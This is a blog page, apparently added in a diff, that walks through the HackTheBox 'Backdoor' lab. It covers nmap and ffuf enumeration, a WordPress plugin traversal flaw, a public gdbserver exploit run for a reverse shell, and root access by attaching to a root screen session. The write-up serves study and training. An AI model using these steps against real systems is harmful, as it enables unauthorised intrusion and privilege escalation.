@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 b4🇩🇪43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqz2EAb2SBSzEIxcu&#43;9dzgUZzDJGdCFWjwuxjhwtpq3sGiUQ1jgwf7h5BE&#43;AlYhSX0oqoOLPKA/QHLxvJ9sYz0ijBL7aEJU8tYHchYMCMu0e8a71p3UGirTjn2tBVe3RSCo/XRQOM/ztrBzlqlKHcqMpttqJHphVA0/1dP7uoLCJlAOOWnW0K311DXkxfOiKRc2izbgfgimMDR4T1C17/oh9355TBgGGg2F7AooUpdtsahsiFItCRkvVB1G7DQiGqRTWsFaKBkHPVMQFaLEm5DK9H7PRwE&#43;UYCah/Wp95NkwWj3u3H93p4V2y0Y6kdjF/L&#43;BRmB44XZXm2Vu7BN0ouuT1SP3zu8YUe3FHshFIml7Ac/8zL1twLpnQ9Hv8KXnNKPoHgrU&#43;sh35cd0JbCqyPFG5yziL8smr7Q4z9/XeATKzL4bcjG87sGtZMtB8alQS7yFA6wmqyWqLFQ4rpi2S0CoslyQnighQSwNaWuBYXvOLi6AsgckJLS44L8LxU4J8=| 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIuoNkiwwo7nM8ZE767bKSHJh&#43;RbMsbItjTbVvKK4xKMfZFHzroaLEe9a2/P1D9h2M6khvPI74azqcqnI8SUJAk=| 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7eoJSCw4DyNNaFftGoFcX4Ttpwf&#43;RPo0ydNk7yfqca80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))|_http-generator: WordPress 5.8.1|_http-title: Backdoor &amp;amp;#8211; Real-Life|_http-server-header: Apache/2.4.41 (Ubuntu)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONSService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf ." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/hackthebox/backdoor/backdoor/" />
+
+
+    <title>
+        
+            Backdoor :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Backdoor">
+<meta itemprop="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 b4🇩🇪43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqz2EAb2SBSzEIxcu&#43;9dzgUZzDJGdCFWjwuxjhwtpq3sGiUQ1jgwf7h5BE&#43;AlYhSX0oqoOLPKA/QHLxvJ9sYz0ijBL7aEJU8tYHchYMCMu0e8a71p3UGirTjn2tBVe3RSCo/XRQOM/ztrBzlqlKHcqMpttqJHphVA0/1dP7uoLCJlAOOWnW0K311DXkxfOiKRc2izbgfgimMDR4T1C17/oh9355TBgGGg2F7AooUpdtsahsiFItCRkvVB1G7DQiGqRTWsFaKBkHPVMQFaLEm5DK9H7PRwE&#43;UYCah/Wp95NkwWj3u3H93p4V2y0Y6kdjF/L&#43;BRmB44XZXm2Vu7BN0ouuT1SP3zu8YUe3FHshFIml7Ac/8zL1twLpnQ9Hv8KXnNKPoHgrU&#43;sh35cd0JbCqyPFG5yziL8smr7Q4z9/XeATKzL4bcjG87sGtZMtB8alQS7yFA6wmqyWqLFQ4rpi2S0CoslyQnighQSwNaWuBYXvOLi6AsgckJLS44L8LxU4J8=| 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIuoNkiwwo7nM8ZE767bKSHJh&#43;RbMsbItjTbVvKK4xKMfZFHzroaLEe9a2/P1D9h2M6khvPI74azqcqnI8SUJAk=| 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7eoJSCw4DyNNaFftGoFcX4Ttpwf&#43;RPo0ydNk7yfqca80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))|_http-generator: WordPress 5.8.1|_http-title: Backdoor &amp;#8211; Real-Life|_http-server-header: Apache/2.4.41 (Ubuntu)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONSService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf ."><meta itemprop="datePublished" content="2022-09-20T14:03:31+01:00" />
+<meta itemprop="dateModified" content="2022-09-20T14:03:31+01:00" />
+<meta itemprop="wordCount" content="844"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content="Backdoor"/>
+<meta name="twitter:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 b4🇩🇪43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqz2EAb2SBSzEIxcu&#43;9dzgUZzDJGdCFWjwuxjhwtpq3sGiUQ1jgwf7h5BE&#43;AlYhSX0oqoOLPKA/QHLxvJ9sYz0ijBL7aEJU8tYHchYMCMu0e8a71p3UGirTjn2tBVe3RSCo/XRQOM/ztrBzlqlKHcqMpttqJHphVA0/1dP7uoLCJlAOOWnW0K311DXkxfOiKRc2izbgfgimMDR4T1C17/oh9355TBgGGg2F7AooUpdtsahsiFItCRkvVB1G7DQiGqRTWsFaKBkHPVMQFaLEm5DK9H7PRwE&#43;UYCah/Wp95NkwWj3u3H93p4V2y0Y6kdjF/L&#43;BRmB44XZXm2Vu7BN0ouuT1SP3zu8YUe3FHshFIml7Ac/8zL1twLpnQ9Hv8KXnNKPoHgrU&#43;sh35cd0JbCqyPFG5yziL8smr7Q4z9/XeATKzL4bcjG87sGtZMtB8alQS7yFA6wmqyWqLFQ4rpi2S0CoslyQnighQSwNaWuBYXvOLi6AsgckJLS44L8LxU4J8=| 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIuoNkiwwo7nM8ZE767bKSHJh&#43;RbMsbItjTbVvKK4xKMfZFHzroaLEe9a2/P1D9h2M6khvPI74azqcqnI8SUJAk=| 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7eoJSCw4DyNNaFftGoFcX4Ttpwf&#43;RPo0ydNk7yfqca80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))|_http-generator: WordPress 5.8.1|_http-title: Backdoor &amp;#8211; Real-Life|_http-server-header: Apache/2.4.41 (Ubuntu)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONSService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf ."/>
+
+
+
+    <meta property="og:title" content="Backdoor" />
+<meta property="og:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 b4🇩🇪43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqz2EAb2SBSzEIxcu&#43;9dzgUZzDJGdCFWjwuxjhwtpq3sGiUQ1jgwf7h5BE&#43;AlYhSX0oqoOLPKA/QHLxvJ9sYz0ijBL7aEJU8tYHchYMCMu0e8a71p3UGirTjn2tBVe3RSCo/XRQOM/ztrBzlqlKHcqMpttqJHphVA0/1dP7uoLCJlAOOWnW0K311DXkxfOiKRc2izbgfgimMDR4T1C17/oh9355TBgGGg2F7AooUpdtsahsiFItCRkvVB1G7DQiGqRTWsFaKBkHPVMQFaLEm5DK9H7PRwE&#43;UYCah/Wp95NkwWj3u3H93p4V2y0Y6kdjF/L&#43;BRmB44XZXm2Vu7BN0ouuT1SP3zu8YUe3FHshFIml7Ac/8zL1twLpnQ9Hv8KXnNKPoHgrU&#43;sh35cd0JbCqyPFG5yziL8smr7Q4z9/XeATKzL4bcjG87sGtZMtB8alQS7yFA6wmqyWqLFQ4rpi2S0CoslyQnighQSwNaWuBYXvOLi6AsgckJLS44L8LxU4J8=| 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIuoNkiwwo7nM8ZE767bKSHJh&#43;RbMsbItjTbVvKK4xKMfZFHzroaLEe9a2/P1D9h2M6khvPI74azqcqnI8SUJAk=| 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7eoJSCw4DyNNaFftGoFcX4Ttpwf&#43;RPo0ydNk7yfqca80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))|_http-generator: WordPress 5.8.1|_http-title: Backdoor &amp;#8211; Real-Life|_http-server-header: Apache/2.4.41 (Ubuntu)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONSService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/hackthebox/backdoor/backdoor/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2022-09-20T14:03:31+01:00" />
+<meta property="article:modified_time" content="2022-09-20T14:03:31+01:00" /><meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+
+    <meta property="article:section" content="HackTheBox" />
+
+
+
+    <meta property="article:published_time" content="2022-09-20 14:03:31 &#43;0100 WAT" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/hackthebox/backdoor/backdoor/">Backdoor</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">nmap</h3>
+<pre tabindex="0"><code>PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 b4🇩🇪43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqz2EAb2SBSzEIxcu+9dzgUZzDJGdCFWjwuxjhwtpq3sGiUQ1jgwf7h5BE+AlYhSX0oqoOLPKA/QHLxvJ9sYz0ijBL7aEJU8tYHchYMCMu0e8a71p3UGirTjn2tBVe3RSCo/XRQOM/ztrBzlqlKHcqMpttqJHphVA0/1dP7uoLCJlAOOWnW0K311DXkxfOiKRc2izbgfgimMDR4T1C17/oh9355TBgGGg2F7AooUpdtsahsiFItCRkvVB1G7DQiGqRTWsFaKBkHPVMQFaLEm5DK9H7PRwE+UYCah/Wp95NkwWj3u3H93p4V2y0Y6kdjF/L+BRmB44XZXm2Vu7BN0ouuT1SP3zu8YUe3FHshFIml7Ac/8zL1twLpnQ9Hv8KXnNKPoHgrU+sh35cd0JbCqyPFG5yziL8smr7Q4z9/XeATKzL4bcjG87sGtZMtB8alQS7yFA6wmqyWqLFQ4rpi2S0CoslyQnighQSwNaWuBYXvOLi6AsgckJLS44L8LxU4J8=
+|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIuoNkiwwo7nM8ZE767bKSHJh+RbMsbItjTbVvKK4xKMfZFHzroaLEe9a2/P1D9h2M6khvPI74azqcqnI8SUJAk=
+|   256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7eoJSCw4DyNNaFftGoFcX4Ttpwf+RPo0ydNk7yfqca
+80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: WordPress 5.8.1
+|_http-title: Backdoor &amp;#8211; Real-Life
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><h3 id="ffuf">ffuf</h3>
+<pre tabindex="0"><code>.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
+.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
+.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
+                        [Status: 200, Size: 63830, Words: 3830, Lines: 330]
+index.php               [Status: 301, Size: 0, Words: 1, Lines: 1]
+server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
+wp-admin                [Status: 301, Size: 315, Words: 20, Lines: 10]
+wp-content              [Status: 301, Size: 317, Words: 20, Lines: 10]
+wp-includes             [Status: 301, Size: 318, Words: 20, Lines: 10]
+xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1]
+</code></pre><p>The website is powered by <code>wordpress</code>&hellip;always good to know</p>
+<pre tabindex="0"><code>&lt;meta name=&#34;generator&#34; content=&#34;WordPress 5.8.1&#34; /&gt;
+&lt;link rel=&#34;canonical&#34; href=&#34;http://backdoor.htb/&#34; /&gt;
+&lt;link rel=&#39;shortlink&#39; href=&#39;http://backdoor.htb/&#39; /&gt;
+</code></pre><p>When clicking on home button it points to <code>backdoor.htb</code> so I add it to <code>/etc/hosts</code></p>
+<p>wich make me look for potential vhosts and subdomains but nah&hellip;</p>
+<p>when visiting the pages found with the fuzzer we notice with have access to <code>wp-content</code></p>
+<p>try to access he <code>plugins</code> direcory at <code>/wp-content/plugins/</code></p>
+<p>there is a single plugin installed :</p>
+<p><code>ebook-download</code></p>
+<pre tabindex="0"><code>=== Plugin Name ===
+Contributors: zedna
+Donate link: https://www.paypal.com/cgi-bin/webscr?cmd=_donations&amp;business=3ZVGZTC7ZPCH2&amp;lc=CZ&amp;item_name=Zedna%20Brickick%20Website&amp;currency_code=USD&amp;bn=PP%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted
+Tags: ebook, file, download
+Requires at least: 3.0.4
+Tested up to: 4.4
+Stable tag: 1.1
+License: GPLv2 or later
+License URI: http://www.gnu.org/licenses/gpl-2.0.html
+
+Allow user to download your ebook custom file when insert an email.
+</code></pre><p>we google that for exploits and end up <a href="https://www.exploit-db.com/exploits/39575">here!</a></p>
+<p>that&rsquo;s simple dir traversal dawg&hellip;.</p>
+<p>ye no it was not &ldquo;simple&rdquo;&hellip;I was stuck here for days</p>
+<p>went to the forums and SEEMS LIKE I MISSED A PORT???</p>
+<p>ran nmap again&hellip;again&hellip;aggressive mode ad all but I could not get it</p>
+<p>analyzed that specific port and it was filtered? resetting the machine didnt help</p>
+<p>Did that later and wtf?</p>
+<pre tabindex="0"><code>└──╼ $nmap backdoor.htb -p 1337            
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-08 16:08 WAT
+Nmap scan report for backdoor.htb (10.10.11.125)
+Host is up (0.13s latency).
+
+PORT     STATE SERVICE
+1337/tcp open  waste
+</code></pre><p>Anyway long story short we get an exploit for <code>gdb-server</code> on exploit-db</p>
+<p>we run it and get access.</p>
+<p>Hey don&rsquo;t ask me I am confused too XD</p>
+<pre tabindex="0"><code>└──╼ $python 50539.py 10.10.11.125:1337 rev.bin
+[+] Connected to target. Preparing exploit
+[+] Found x64 arch
+[+] Sending payload
+[*] Pwned!! Check your listener
+</code></pre><pre tabindex="0"><code>cat user.txt
+</code></pre><h2 id="privilege-escalation">privilege escalation</h2>
+<p><code>sudo -l</code> would not work&hellip;how about <code>suid</code>?</p>
+<pre tabindex="0"><code>user@Backdoor:/home/user$ find / -perm -u=s 2&gt; /dev/null
+find / -perm -u=s 2&gt; /dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/fusermount
+/usr/bin/screen
+/usr/bin/umount
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/pkexec
+</code></pre><p>what is <code>screen</code>?</p>
+<p>Gtfobins say&hellip;well&hellip;I know this one but not with SUID</p>
+<pre tabindex="0"><code>user@Backdoor:/home/user$ screen -h
+screen -h
+Use: screen [-opts] [cmd [args]]
+ or: screen -r [host.tty]
+
+Options:
+-4            Resolve hostnames only to IPv4 addresses.
+-6            Resolve hostnames only to IPv6 addresses.
+-a            Force all capabilities into each window&#39;s termcap.
+-A -[r|R]     Adapt all windows to the new display width &amp; height.
+-c file       Read configuration file instead of &#39;.screenrc&#39;.
+-d (-r)       Detach the elsewhere running screen (and reattach here).
+-dmS name     Start as daemon: Screen session in detached mode.
+-D (-r)       Detach and logout remote (and reattach here).
+-D -RR        Do whatever is needed to get a screen session.
+-e xy         Change command characters.
+-f            Flow control on, -fn = off, -fa = auto.
+-h lines      Set the size of the scrollback history buffer.
+-i            Interrupt output sooner when flow control is on.
+-l            Login mode on (update /var/run/utmp), -ln = off.
+-ls [match]   or
+-list         Do nothing, just list our SockDir [on possible matches].
+-L            Turn on output logging.
+-Logfile file Set logfile name.
+-m            ignore $STY variable, do create a new screen session.
+-O            Choose optimal output rather than exact vt100 emulation.
+-p window     Preselect the named window if it exists.
+-q            Quiet startup. Exits with non-zero return code if unsuccessful.
+-Q            Commands will send the response to the stdout of the querying process.
+-r [session]  Reattach to a detached screen process.
+-R            Reattach if possible, otherwise start a new session.
+-s shell      Shell to execute rather than $SHELL.
+-S sockname   Name this session &lt;pid&gt;.sockname instead of &lt;pid&gt;.&lt;tty&gt;.&lt;host&gt;.
+-t title      Set title. (window&#39;s name).
+-T term       Use term as $TERM for windows, rather than &#34;screen&#34;.
+-U            Tell screen to use UTF-8 encoding.
+-v            Print &#34;Screen version 4.08.00 (GNU) 05-Feb-20&#34;.
+-wipe [match] Do nothing, just clean up SockDir [on possible matches].
+-x            Attach to a not detached screen. (Multi display mode).
+-X            Execute &lt;cmd&gt; as a screen command in the specified session.
+</code></pre><p>hmm&hellip;okay</p>
+<pre tabindex="0"><code>export TERM=xterm
+screen -x root/root
+</code></pre><pre tabindex="0"><code>root@Backdoor:~# cat root.txt
+cat root.txt
+</code></pre><p>That was a fun box, but it left me with many questions</p>
+<p>The forums said the LFI was supposed to serve for reading <code>proc</code> file about the <code>gbd-server</code></p>
+<p>the privilge escalation was not hard though</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://nair0lf32.github.io/zer0ne/categories/hackthebox/">HackTheBox</a></span>
+        
+    </p>
+
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2022</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.cf7fb2a9e24608a783e05e4472da2fdf008293289de1ad88d1cba5c143e7e414496dd33b6a228e92f8461ce0c8cbad3c9f9847e73e46dfbce0463393ddd1733a.js" integrity="sha512-z3&#43;yqeJGCKeD4F5Ectov3wCCkyid4a2I0culwUPn5BRJbdM7aiKOkvhGHODIy608n5hH5z5G37zgRjOT3dFzOg=="></script>
+
+
+
+    </body>
+</html>
